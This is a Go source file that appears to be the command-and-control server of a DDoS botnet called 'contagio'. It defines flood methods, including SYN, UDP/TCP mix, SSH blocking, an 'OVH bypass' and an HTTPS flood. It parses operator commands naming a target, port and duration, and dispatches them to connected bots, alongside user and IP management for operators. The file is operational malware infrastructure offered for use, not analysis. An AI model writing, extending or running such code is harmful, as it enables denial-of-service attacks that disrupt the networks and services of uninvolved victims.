package cnc

import (
	"bufio"
	"bytes"
	"contagio/contagio/bot_server"
	"contagio/contagio/cnc/database"
	"fmt"
	"net"
	"net/textproto"
	"strconv"
	"strings"
)

var cmdlist = []string{

	// bootnet methods
	"!udpmix",
	"!https",
	"!sshblock",
	"!tcpmix",
	"!ovhudp",
	"!syn",

	// other

	"methods",

	"adduser",
	"bots",
	"removeuser",
	"ipadd",
	"removeip",
	"help",
	"?",
}

type CommandsInfo struct {
	Description string
	Name        string
}

type MethodsInfo struct {
	Description string
	Name        string
	Layer       int
}

var methodsCommand = map[int]MethodsInfo{
	0: {
		Description: "Tcp synchronize flood",
		Name:        "!syn",
		Layer:       4,
	},
	1: {
		Description: "Udp with mixed packets",
		Name:        "!udpmix",
		Layer:       4,
	},
	2: {
		Description: "Blocks ssh connection",
		Name:        "!sshblock",
		Layer:       4,
	},
	3: {
		Description: "Tcp with mixed packets",
		Name:        "!tcpmix",
		Layer:       4,
	},
	4: {
		Description: "Udp ovh bypass",
		Name:        "!ovhudp",
		Layer:       4,
	},
	5: {
		Description: "Basic https flood",
		Name:        "!https",
		Layer:       7,
	},
}

var helpCommands = map[int]CommandsInfo{
	0: {
		Description: "Adds a new user to the database",
		Name:        "adduser",
	},
	1: {
		Description: "Bot count",
		Name:        "bots",
	},
	2: {
		Description: "Removes a user from the database",
		Name:        "removeuser",
	},
	3: {
		Description: "Adds a new ip to the database",
		Name:        "ipadd",
	},
	4: {
		Description: "Removes ip from the database",
		Name:        "removeip",
	},
	5: {
		Description: "List of botnet methods",
		Name:        "methods",
	},
}

func (c *Connection) CommandHandler() error {

	defer Catch()

	_, err := c.conn.Write([]byte(c.GenerateCmdPrompt(c.config.Cnc.CmdPrompt)))
	if err != nil {
		c.conn.Close()
		return err
	}

	reader := bufio.NewReader(c.conn)
	tp := textproto.NewReader(reader)
	command, err := tp.ReadLine()

	if err != nil {
		c.conn.Close()
		return err
	}

	if bytes.EqualFold([]byte(command), []byte{255, 244, 255, 253, 6}) { // ctrl +c
		c.conn.Close()
		return nil
	}

	if strings.HasPrefix(command, "exit") || strings.HasPrefix(command, "quit") {
		c.conn.Close()
		return nil
	}

	if !strings.HasPrefix(command, "!") {
		if c.OtherCommands(command) {
			c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.UnknownCommandError)))
			return nil
		}
		return nil
	}

	checkcmd := func() bool {
		defer Catch()
		for _, i := range cmdlist {
			if strings.HasPrefix(command, i) {
				return true
			}
		}
		return false
	}()

	checksyntax := func() bool {

		defer Catch()
		cmd := strings.Split(command, " ")

		if len(cmd) != 4 {
			return false
		}

		if strings.HasPrefix(command, "!udpmix") || strings.HasPrefix(command, "!tcpmix") || strings.HasPrefix(command, "!sshblock") || strings.HasPrefix(command, "!syn") || strings.HasPrefix(command, "!ovhudp") {
			ip := strings.Split(cmd[1], ".")

			if len(ip) != 4 {
				return false
			}

			err := net.ParseIP(cmd[1])
			if err == nil {
				return false
			}

		}

		if strings.HasPrefix(command, "!https") {
			if !strings.HasPrefix(cmd[1], "https://") {
				return false
			}
		}

		if strings.HasPrefix(command, "!socket") {
			if !strings.HasPrefix(cmd[1], "http://") {
				return false
			}

		}

		return true

	}()

	if !checkcmd {
		c.conn.Write([]byte(GeneratePrompt(GeneratePrompt(c.config.Cnc.UnknownCommandError))))
		return nil
	}

	if !checksyntax {
		c.conn.Write([]byte(c.syntax(command)))
		return nil
	}

	go bot_server.SendCommand(command)

	bc := bot_server.BotCount

	botsc := strings.ReplaceAll(c.config.Cnc.CommandSent, "{bots}", strconv.Itoa(bc))

	c.conn.Write([]byte(GeneratePrompt(botsc)))

	return nil
}

func (c *Connection) syntax(command string) string {

	defer Catch()

	var synt, syntexample string
	var res = c.config.Cnc.InvalidCommandSyntaxError

	args := strings.Split(command, " ")

	if strings.HasPrefix(command, "!https") || strings.HasPrefix(command, "!socket") {

		if strings.HasPrefix(command, "!https") {
			synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
			syntexample = fmt.Sprintf("%s https://example.com 443 60", args[0])
		} else {
			synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
			syntexample = fmt.Sprintf("%s http://example.com 80 60", args[0])
		}
	} else { // layer 4

		synt = fmt.Sprintf("%s <TARGET> <PORT> <TIME>", args[0])
		syntexample = fmt.Sprintf("%s 1.1.1.1 22 60", args[0])

	}

	res = strings.ReplaceAll(res, "{syntax}", synt)
	res = strings.ReplaceAll(res, "{example}", syntexample)

	return GeneratePrompt(res)

}

// true - unknown
func (c *Connection) OtherCommands(command string) bool {
	defer Catch()

	var res = c.config.Cnc.CommandInvalidSyntax
	var suc = GeneratePrompt(c.config.Cnc.CommandExecuted)

	if strings.HasPrefix(command, "adduser") {

		// admin perms

		if c.login != c.config.RootLogin {
			return true
		}

		cmd := strings.Split(command, " ")

		if len(cmd) < 3 {
			res = strings.ReplaceAll(res, "{syntax}", "adduser <LOGIN> <PASSWORD>")
			res = strings.ReplaceAll(res, "{example}", "adduser user pass")

			c.conn.Write([]byte(GeneratePrompt(res)))
			return false
		}

		database.AddUser(cmd[1], cmd[2])
		c.conn.Write([]byte(suc))

		return false

	}

	if strings.HasPrefix(command, "methods") {
		if c.config.Cnc.CustomMethodsEnabled {
			for _, i := range c.config.Cnc.CustomMethods {
				c.conn.Write([]byte(GeneratePrompt(i)))
			}
			return false
		}

		methods := c.config.Cnc.MethodsCommand

		var temp string
		var f = make([]string, 0)
		var a = make([]string, 0)
		var res = make([]string, 0)

		for range methodsCommand {
			temp += methods + "\n"
		}

		for x, i := range strings.Split(temp, "\n") {
			a = append(a, strings.Replace(i, "{name}", methodsCommand[x].Name, 1))
		}

		for x, i := range a {
			f = append(f, strings.Replace(i, "{description}", methodsCommand[x].Description, 1))
		}

		for x, i := range f {
			res = append(res, strings.Replace(i, "{layer}", strconv.Itoa(methodsCommand[x].Layer), 1))
		}

		c.conn.Write(bytes.TrimSuffix([]byte(GeneratePrompt(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
		return false

	}

	if strings.HasPrefix(command, "help") || strings.HasPrefix(command, "?") {

		if c.config.Cnc.CustomHelpEnabled {
			for _, i := range c.config.Cnc.CustomHelp {
				c.conn.Write([]byte(GeneratePrompt(i)))
			}
			return false
		}

		help := c.config.Cnc.HelpCommand

		var temp string
		var f = make([]string, 0)
		var res = make([]string, 0)

		for range helpCommands {
			temp += help + "\n"
		}

		for x, i := range strings.Split(temp, "\n") {
			f = append(f, strings.Replace(i, "{command}", helpCommands[x].Name, 1))
		}

		for x, i := range f {
			res = append(res, strings.Replace(i, "{description}", helpCommands[x].Description, 1))

		}

		//
		c.conn.Write(bytes.TrimSuffix([]byte(GeneratePrompt(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
		return false
	}

	if strings.HasPrefix(command, "addip") {

		// admin perms

		if c.login != c.config.RootLogin {
			return true
		}

		cmd := strings.Split(command, " ")

		if len(cmd) < 2 {
			res = strings.ReplaceAll(res, "{syntax}", "addip <IP>")
			res = strings.ReplaceAll(res, "{example}", "addip 127.0.0.1")

			c.conn.Write([]byte(GeneratePrompt(res)))
			return false
		}

		database.AddIp(cmd[1])
		c.conn.Write([]byte(suc))

		return false

	}

	if strings.HasPrefix(command, "cls") || strings.HasPrefix(command, "clear") {
		c.CncMainMenu()
		return false
	}

	if strings.HasPrefix(command, "bots") {

		// admin perms

		if c.login != c.config.RootLogin {
			return true
		}

		bc := bot_server.GetBots()

		if bc == "" {
			c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.NoBotsConnectedError)))
			return false

		}

		botsc := strings.ReplaceAll(c.config.Cnc.BotCount, "{bots}", bc)

		c.conn.Write([]byte(GeneratePrompt(botsc)))
		// c.conn.Write([]byte("Bot count: " + strconv.Itoa(bot_server.BotCount)))
		return false
	}

	if strings.HasPrefix(command, "removeuser") {

		// admin perms

		if c.login != c.config.RootLogin {
			return true
		}

		cmd := strings.Split(command, " ")

		if len(cmd) < 2 {
			res = strings.ReplaceAll(res, "{syntax}", "removeuser <LOGIN>")
			res = strings.ReplaceAll(res, "{example}", "removeuser user")

			c.conn.Write([]byte(GeneratePrompt(res)))
			return false
		}

		database.RemoveUser(cmd[1])
		c.conn.Write([]byte(suc))

		return false
	}

	if strings.HasPrefix(command, "removeip") {

		// admin perms

		if c.login != c.config.RootLogin {
			return true
		}

		cmd := strings.Split(command, " ")

		if len(cmd) < 2 {
			res = strings.ReplaceAll(res, "{syntax}", "removeip <IP>")
			res = strings.ReplaceAll(res, "{example}", "removeip 127.0.0.1")

			c.conn.Write([]byte(GeneratePrompt(res)))
			return false
		}

		database.RemoveIp(cmd[1])
		c.conn.Write([]byte(suc))

		return false
	}

	return true

}
